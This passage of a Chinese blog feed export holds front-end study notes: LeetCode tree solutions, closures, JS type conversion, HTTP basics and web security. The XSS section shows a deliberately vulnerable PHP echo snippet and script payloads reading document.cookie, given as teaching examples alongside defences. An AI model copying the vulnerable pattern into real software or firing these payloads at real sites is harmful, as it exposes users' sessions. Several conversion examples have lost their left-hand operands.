class="keyword">if</span>(nums.length === <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    <span class="keyword">let</span> mid = <span class="built_in">parseInt</span>(nums.length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">let</span> root = <span class="keyword">new</span> TreeNode(nums[mid])</span><br><span class="line">    root.left = sortedArrayToBST(nums.slice(<span class="number">0</span>, mid))</span><br><span class="line">    root.right = sortedArrayToBST(nums.slice(mid + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// parseInt(nums.length / 2)      =&gt;     nums.length &gt;&gt; 1</span></span><br></pre></td></tr></table></figure><h2 id="判断平衡二叉树"><a href="#判断平衡二叉树" class="headerlink" title="判断平衡二叉树"></a>判断平衡二叉树</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isBalanced = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="literal">true</span>; <span class="comment">// 先把所有二叉树先当做平衡二叉树</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">maxHeight</span> (<span class="params">r</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!r) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//当节点不存在时，高度为0</span></span><br><span class="line">        <span class="keyword">let</span> left = maxHeight(r.left);</span><br><span class="line">        <span class="keyword">let</span> right = maxHeight(r.right);<span class="comment">//dfs常规操作,求出左右子树高度</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Math</span>.abs(left-right)&gt;<span class="number">1</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;<span class="comment">//高度差超过1时，非平衡二叉树，直接false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.max(left,right)+<span class="number">1</span> <span class="comment">// 这里加1是因为要把父节点高度算进去</span></span><br><span class="line">    &#125;;</span><br><span class="line">    maxHeight(root);</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="验证前序序列"><a href="#验证前序序列" class="headerlink" title="验证前序序列"></a>验证前序序列</h2><p><a href="https://leetcode-cn.com/problems/verify-preorder-serialization-of-a-binary-tree/" target="_blank" rel="noopener">leetcode331</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">序列化二叉树的一种方法是使用前序遍历。当我们遇到一个非空节点时，我们可以记录下这个节点的值。如果它是一个空节点，我们可以使用一个标记值记录，例如 #。</span><br><span class="line"></span><br><span class="line">     _9_</span><br><span class="line">    /   \</span><br><span class="line">   3     2</span><br><span class="line">  / \   / \</span><br><span class="line"> 4   1  #  6</span><br><span class="line">/ \ / \   / \</span><br><span class="line"># # # #   # #</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入: &quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;</span><br><span class="line">输出: true</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: &quot;1,#&quot;</span><br><span class="line">输出: false</span><br><span class="line"></span><br><span class="line">示例 3:</span><br><span class="line">输入: &quot;9,#,#,1&quot;</span><br><span class="line">输出: false</span><br></pre></td></tr></table></figure><ul><li><p><a href="https://leetcode-cn.com/problems/verify-preorder-serialization-of-a-binary-tree/solution/yan-zheng-er-cha-shu-de-qian-xu-xu-lie-hua-by-leet/" target="_blank" rel="noopener">题解</a></p></li><li><p>初始化可用槽位：slots = 1。</p></li><li><p>根据逗号分隔前序序列化，将结果数组存储，随后遍历该数组：</p><ul><li><p>空节点和非空节点都消耗一个槽位：slots = slot - 1.</p></li><li><p>如果当前的可用槽位是负数，那么这个前序序列化是非法的，返回 False。</p></li><li><p>非空节点（node != ‘#’）新增两个可用槽位：slots = slots + 2.</p></li></ul></li><li><p>如果所有的槽位都消耗完，那么这个前序序列化就是合法的：返回 slots == 0。</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isValidSerialization (preorder) &#123;</span><br><span class="line">          <span class="comment">// "9,3,4,#,#,1,#,#,2,#,6,#,#"</span></span><br><span class="line">          <span class="keyword">let</span> slot = <span class="number">1</span></span><br><span class="line">          <span class="keyword">let</span> arr = preorder.split(<span class="string">","</span>)</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">              slot--</span><br><span class="line">              <span class="keyword">if</span> (slot &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">              <span class="keyword">if</span> (arr[i] !== <span class="string">"#"</span>) &#123;</span><br><span class="line">                  slot += <span class="number">2</span></span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> slot === <span class="number">0</span></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.4</title>
      <link href="2020/03/04/%E6%97%A5%E5%B8%B8-2020.3.4/"/>
      <url>2020/03/04/%E6%97%A5%E5%B8%B8-2020.3.4/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是闭包</li><li>垃圾回收机制</li><li>js隐式转换与显式转换</li></ul><a id="more"></a><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">闭包就是能够读取其他函数内部变量的函数。最常见的就是函数嵌套函数。</span><br><span class="line">闭包的用途：可以读取函数内部的变量，并且让这些变量的值始终保持在内存中。</span><br><span class="line"></span><br><span class="line">嵌套函数的闭包             匿名函数实现累加</span><br><span class="line">function aaa()&#123;           function box()&#123;</span><br><span class="line">    var a=1;                  var age = 100;</span><br><span class="line">    return function()&#123;        return function()&#123;    //匿名函数</span><br><span class="line">        alert(a++)  age++;</span><br><span class="line">    &#125;                               return age;</span><br><span class="line">&#125;                             &#125;</span><br><span class="line">                           &#125;     </span><br><span class="line">循环中的闭包</span><br><span class="line">for(var i=0;i&lt;10;i++)&#123;</span><br><span class="line">    (function(i)&#123;</span><br><span class="line">        console.log(i)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">&#125; //输出0 ~ 9</span><br></pre></td></tr></table></figure><h3 id="两种垃圾回收机制"><a href="#两种垃圾回收机制" class="headerlink" title="两种垃圾回收机制"></a>两种垃圾回收机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.标记清除：内存中所有变量加一个标记，去除环境中的变量以及被环境中变量引用的变量（闭包）剩下的就删除</span><br><span class="line"></span><br><span class="line">2.引用计数：跟踪每个值被引用的次数，当声明变量并赋值时，这个值引用次数+1，该变量值改变时，值的引用次数-1，直到0时回收。（存在循环引用问题）</span><br><span class="line">var obj = &#123;a:1,b:2,c:3&#125;   obj.o=o</span><br><span class="line"></span><br><span class="line">IE浏览器的js对象采用标记清除，DOM对象采用引用计数</span><br><span class="line">闭包会在IE中内存泄露,例如：</span><br><span class="line"></span><br><span class="line">function closure()&#123;</span><br><span class="line">    var oDiv = document.getElementById(&apos;#div&apos;)      //oDiv引用了document.getElementById(&apos;#div&apos;)</span><br><span class="line">    oDiv.onclick = function()&#123;                      //document.getElementById(&apos;#div&apos;)的onclick方</span><br><span class="line">        alert(&apos;oDiv.innerHtml&apos;)                     //法包含oDiv在内环境中的变量，引用了oDiv</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JS隐式转换"><a href="#JS隐式转换" class="headerlink" title="JS隐式转换"></a>JS隐式转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.undefined与null相等，但不恒等（===）</span><br><span class="line">2.一个是number一个是string时，会尝试将string转换为number</span><br><span class="line">3.隐式转换将boolean转换为number，0或1</span><br><span class="line">4.隐式转换将Object转换成number或string，取决于另外一个对比量的类型</span><br><span class="line">5.对于0、空字符串的判断，建议使用 “===” 。</span><br><span class="line">6.“==”会对不同类型值进行类型转换再判断，“===”则不会。它会先判断两边的值类型，类型不匹配时直接为false。</span><br><span class="line"></span><br><span class="line">undefined == null;  // true   </span><br><span class="line">== true;  // true  </span><br><span class="line">== true;  // false  </span><br><span class="line">== false;  // true</span><br><span class="line">== &apos;&apos;;  // true   </span><br><span class="line">NaN == NaN;  // false  NaN不等于任何值</span><br><span class="line">[] == false;  // true  </span><br><span class="line">[] == ![];  // true           !会将其转为布尔值，![]的值为false，==操作符将false转为0，[]==0</span><br><span class="line">&apos;6&apos; - &apos;3&apos;  // 3               []也会转为数字0   0==0</span><br><span class="line">&#123;&#125; == !&#123;&#125;  //false           &#123;&#125; == false  -&gt;  &#123;&#125; == 0  -&gt;   NaN == 0    -&gt;  false</span><br><span class="line">1234 + &apos;abcd&apos; // &quot;1234abcd&quot;</span><br></pre></td></tr></table></figure><h3 id="显式转换"><a href="#显式转换" class="headerlink" title="显式转换"></a>显式转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">显示转换一般指使用Number、String和Boolean三个构造函数，手动将各种类型的值，转换成数字、字符串或者布尔值。</span><br><span class="line">Number(&apos;1234&apos;) // 1234</span><br><span class="line">Number(&apos;1234abcd&apos;) // NaN</span><br><span class="line">Number(&apos;&apos;) // 0</span><br><span class="line">Number(true) // 1</span><br><span class="line">Number(null) // 0</span><br><span class="line">Number(undefined) // NaN</span><br><span class="line">String(1234)  // &quot;1234&quot;</span><br><span class="line">String(&apos;abcd&apos;)  // &quot;abcd&quot;</span><br><span class="line">String(true)  // &quot;true&quot;</span><br><span class="line">String(undefined) // &quot;undefined&quot;</span><br><span class="line">String(null)  // &quot;null&quot;</span><br><span class="line">Boolean(0)  // false</span><br><span class="line">Boolean(undefined)  // false</span><br><span class="line">Boolean(null)  // false</span><br><span class="line">Boolean(NaN)  // false</span><br><span class="line">Boolean(&apos;&apos;)  // false</span><br></pre></td></tr></table></figure><h3 id="几道题"><a href="#几道题" class="headerlink" title="几道题"></a>几道题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.[]+&#123;&#125;     //&quot;[object Object]&quot;</span><br><span class="line">2.&#123;&#125;+[]     //0</span><br><span class="line">3.1+-&apos;1&apos;+1  //1</span><br><span class="line">4.&apos;A&apos;-&apos;B&apos;   //NaN</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.3</title>
      <link href="2020/03/03/%E6%97%A5%E5%B8%B8-2020.3.3/"/>
      <url>2020/03/03/%E6%97%A5%E5%B8%B8-2020.3.3/</url>
      
        <content type="html"><![CDATA[<h2 id="一-回顾"><a href="#一-回顾" class="headerlink" title="一.回顾"></a>一.回顾</h2><p>昨天我们从cooike记住用户名密码为起点，谈到了以下：</p><ul><li>Cooike,sessionStorge,localStorge的区别</li><li>Cooike始终在同源的HTTP请求中携带，什么为同源HTTP</li><li>同源是指协议，域名，端口号相同，又可继续延伸</li><li>协议：HTTP协议和HTTPS协议，SSL，非对称加密算法（RSA）</li><li>OSI中的7层协议，TCP/IP的4层协议，以及我们常学的5层协议</li></ul><a id="more"></a><h2 id="二-今日列表"><a href="#二-今日列表" class="headerlink" title="二.今日列表"></a>二.今日列表</h2><ul><li>关于HTTP，几次握手，返回码</li><li>前端安全问题，几种攻击</li><li>域名，经典问题：浏览器输入网址到页面展示发生了什么</li><li>端口标志了一个进程，浏览器的多进程架构</li></ul><h2 id="三-让我们开始愉快地学习吧"><a href="#三-让我们开始愉快地学习吧" class="headerlink" title="三.让我们开始愉快地学习吧"></a>三.让我们开始愉快地学习吧</h2><h3 id="1-关于HTTP协议"><a href="#1-关于HTTP协议" class="headerlink" title="1.关于HTTP协议"></a>1.关于HTTP协议</h3><ul><li>其实协议就相当于一种语言，两个不同国家的人可以用英语交流，英语就相当于这种协议。</li><li>HTTP的全称是HyperText Transfer Protocol,是应用层的协议之一，其他还有FTP（文件）,SMTP（邮件）等</li><li>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。</li><li>基于请求响应模型，无状态：这次请求和上次无关，所以会有Cooike和Session这种技术</li><li>HTTP请求由三部分构成：请求行，请求头，请求正文</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/2905385-d3d809845229a31b.png?imageMogr2/auto-orient/strip|imageView2/2/w/697/format/webp" alt="1"></p><ul><li>描述一下http的报文头和报文体</li></ul><ol><li>http请求报文由3部分组成（请求行，请求头，请求体）</li></ol><p><img src="https://img-blog.csdn.net/20170707143243946?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGV5dWVfOTk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">请求行：</span><br><span class="line">①是请求方法，GET和POST是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。</span><br><span class="line">②为请求对应的URL地址，它和报文头的Host属性组成完整的请求URL。</span><br><span class="line">③是协议名称及版本号。</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Accept ，请求报文可通过一个“Accept”报文头属性告诉服务端 客户端接受什么类型的响应。</span><br><span class="line">Referer，表示这个请求是从哪个URL过来的</span><br><span class="line">cooike，客户端的Cookie就是通过这个报文头属性传给服务端的</span><br><span class="line"></span><br><span class="line">请求体：</span><br><span class="line"></span><br><span class="line">⑤是报文体，它将一个页面表单中的组件值通过param1=value1&amp;param2=value2的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求URL也可以通过类似于“/chapter15/user.html? param1=value1&amp;param2=value2”的方式传递请求参数。</span><br></pre></td></tr></table></figure><ol start="2"><li>HTTP的响应报文也由三部分组成（响应行+响应头+响应体） </li></ol><p><img src="https://img-blog.csdn.net/20170707145557633?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGV5dWVfOTk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">响应行：</span><br><span class="line">①报文协议及版本； </span><br><span class="line">②状态码及状态描述；</span><br><span class="line">响应头：也是由多个属性组成；</span><br><span class="line">响应体：需要的数据</span><br></pre></td></tr></table></figure><ul><li>请求方法get与post的区别</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.顾名思意，POST可能会修改服务器上的资源的请求</span><br><span class="line">2.来看一下实例</span><br><span class="line">GET http://weibo.com/signup/signup.php?inviteCode=2388493434</span><br><span class="line">POST /inventory-check.cgi HTTP/1.1</span><br><span class="line">GET请求，请求的数据会附加在URL之后，以?分割URL和传输数据，多个参数用&amp;连接，传输数据会受URL长度限制</span><br><span class="line">POST请求：POST请求会把请求的数据放置在HTTP请求包的包体中，数据不受限制，数据不暴露会更安全</span><br></pre></td></tr></table></figure><ul><li>常见的状态码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1XXInformational（信息性状态码）接受的请求正在处理</span><br><span class="line">2XXSuccess（成功状态码）请求正常处理完毕</span><br><span class="line">3XXRedirection（重定向状态码）请求的URL已移走。响应报文中应该包含一个Location URL，说明资源现在所处</span><br><span class="line">4XXClient Error（客户端错误状态码）服务器无法处理请求</span><br><span class="line">5XXServer Error（服务器错误状态码）服务器处理请求出错</span><br><span class="line"></span><br><span class="line"> 2XX——表明请求被正常处理了</span><br><span class="line">1、200 OK：请求已正常处理。</span><br><span class="line">2、204 No Content：请求处理成功，但没有任何资源可以返回给客户端，</span><br><span class="line"></span><br><span class="line">3XX——表明浏览器需要执行某些特殊的处理以正确处理请求</span><br><span class="line"></span><br><span class="line">4、301 Moved Permanently：资源的uri已更新，你也更新下你的书签引用吧。永久性重定向，请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI。</span><br><span class="line"></span><br><span class="line">5、302 Found：资源的URI已临时定位到其他位置了，姑且算你已经知道了这个情况了。临时性重定向。和301相似，但302代表的资源不是永久性移动，只是临时性性质的。换句话说，已移动的资源对应的URI将来还有可能发生改变。</span><br><span class="line"></span><br><span class="line">7、304 Not Modified：304状态码是告诉浏览器可以从缓存中获取所请求的资源。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4XX——表明客户端是发生错误的原因所在。</span><br><span class="line"></span><br><span class="line">9、400 Bad Request：服务器端无法理解客户端发送的请求，请求报文中可能存在语法错误。</span><br><span class="line"></span><br><span class="line">12、404 Not Found：服务器上没有请求的资源。路径错误等。</span><br><span class="line"></span><br><span class="line">5XX——服务器本身发生错误</span><br><span class="line"></span><br><span class="line">13、500 Internal Server Error：貌似内部资源出故障了。该状态码表明服务器端在执行请求时发生了错误。也有可能是web应用存在bug或某些临时故障。</span><br><span class="line"></span><br><span class="line">14、503 Service Unavailable：抱歉，我现在正在忙着。该状态码表明服务器暂时处于超负载或正在停机维护，现在无法处理请求。</span><br></pre></td></tr></table></figure><ul><li>三次握手（连接时）与四次握手（断开连接时）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">三次握手：通俗的讲</span><br><span class="line">客户端：HI听见了吗,</span><br><span class="line">服务器端：HI我听见了，</span><br><span class="line">客户端：我也听见你了。     接下来开始愉快地聊天</span><br><span class="line">四次握手：通俗的讲</span><br><span class="line">客户端：我们分手把，</span><br><span class="line">服务端：好的，你等我把数据给你传输完</span><br><span class="line">服务端：我传输完了，</span><br><span class="line">客户端：好了，可以分手了。 接下来就真正的分手了</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20180717202520531?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="11"></p><p><img src="https://img-blog.csdn.net/20180717204202563?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTUwMzE2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="12"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？</span><br><span class="line"></span><br><span class="line">为了保证A发送的最后一个ACK报文能够到达B。这个ACK报文段有可能丢失，因而使处在LAST-ACK状态的B收不到对已发送的FIN+ACK报文段的确认。B会超时重传这个FIN+ACK报文段，而A就能在2MSL时间内收到这个重传的FIN+ACK报文段。</span><br><span class="line"></span><br><span class="line">为什么不能用两次握手进行连接？</span><br></pre></td></tr></table></figure><ul><li>http1.0,1.1和http2的区别</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HTTP1.0:</span><br><span class="line">规定浏览器和服务器保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器处理完成后立即断开TCP连接（无连接），服务器不跟踪每个客户端也不记录过去的请求（无状态）。</span><br><span class="line"></span><br><span class="line">HTTP1.1:</span><br><span class="line">(1)首先是长连接，HTTP1.1增加了一个Connection字段，通过设置Keep-Alive可以保持HTTP连接不断开，避免了每次客户端与服务器请求都要重复建立释放建立TCP连接，提高了网络的利用率。</span><br><span class="line">(2)其次，是HTTP1.1支持请求管道化（pipelining）。管线化使得请求能够“并行”传输。举个例子来说，假如响应的主体是一个html页面，页面中包含了很多img，这个时候keep-alive就起了很大的作用，能够进行“并行”发送多个请求。</span><br><span class="line"></span><br><span class="line">HTTP2:</span><br><span class="line">(1)二进制分帧</span><br><span class="line">(2) 多路复用</span><br><span class="line">(3)首部压缩</span><br><span class="line">(4）支持服务器推送</span><br></pre></td></tr></table></figure><h3 id="2-前端安全问题：跨站脚本攻击XSS"><a href="#2-前端安全问题：跨站脚本攻击XSS" class="headerlink" title="2.前端安全问题：跨站脚本攻击XSS"></a>2.前端安全问题：跨站脚本攻击XSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。</span><br><span class="line"></span><br><span class="line">XSS的攻击一般分为以下几类：反射型XSS，存储型XSS，DOM XSS。</span><br><span class="line">1.反射型XSS:</span><br><span class="line">当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，  浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射.例如：用get方式请求。</span><br><span class="line">&lt;?php</span><br><span class="line">        $username = $_GET[&apos;username&apos;];</span><br><span class="line">        echo $username;</span><br><span class="line">?&gt;</span><br><span class="line">http://www.targetserver.com/test.php?Username=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line">2.存储型XSS：</span><br><span class="line">举一个简单的例子，比如在一个页面修改用户名与备注的时候，备注中的javascript代码就会存储到数据库中，</span><br><span class="line">用户姓名：攻击者</span><br><span class="line">备注：&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line">3.DOM XSS：</span><br><span class="line">在一个应用程序的HTML页面里有时候会包含解析URL（通过访问document.URL 或者 document.location）和执      行一些客户端逻辑的javascript代码。</span><br><span class="line"></span><br><span class="line">例子就是对这样一个逻辑的说明</span><br><span class="line">    &lt;SCRIPT&gt;</span><br><span class="line">    document.write(document.URL.substring(pos,document.URL.length));</span><br><span class="line">    &lt;/SCRIPT&gt;</span><br><span class="line">    但是如果链接是这样的：</span><br><span class="line">    http://www.targetserver.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; </span><br><span class="line">    </span><br><span class="line">    当用户的浏览器解析到html中的javacript代码时，会引用document.URL,那么链接中的恶意代码将会被解析并嵌     入到HTML中，之后会执行alert(document.cooike)，这样就达到了DOM XSS攻击的效果。</span><br></pre></td></tr></table></figure><ul><li>如何防御:对输入(和URL参数)进行过滤，对输出进行编码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.对输入和URL参数进行过滤：对于每一个输入，在客户端和服务器端还要进行各种验证，验证是否合法字符，长度是否合法，格式是否正确。</span><br><span class="line">2.对输出进行编码：在输出数据之前对潜在的威胁的字符进行编码、转义，&lt;转为&amp;lt</span><br><span class="line">    对Cooike设置HttpOnly属性，js脚本就不能读取到COOIKE</span><br></pre></td></tr></table></figure><ul><li>CSRF</li></ul><p><img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="23"></p><p><strong>服务端进行CSRF防御</strong></p><p>　　服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p><ul><li>什么是跨域</li></ul><p>出现请求跨域错误问题,主要原因就是因为浏览器的“同源策略”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">跨域解决方案</span><br><span class="line">1、 通过jsonp跨域: 直接请求文件不行，请求JS可以，我们就把数据以JSON格式装进JS文件里</span><br><span class="line"></span><br><span class="line">客户端：                               服务端的js文件：</span><br><span class="line">function handleCallback(res) &#123;  handleCallback(&#123;</span><br><span class="line">        alert(JSON.stringify(res));       &quot;status&quot;: true, &quot;user&quot;: &quot;admin&quot;</span><br><span class="line">&#125;                                     &#125;)</span><br><span class="line"></span><br><span class="line">2、 document.domain + iframe跨域:</span><br><span class="line">    news.baidu.com和map.baidu.com的一级域名相同，故可以设置document.domain = 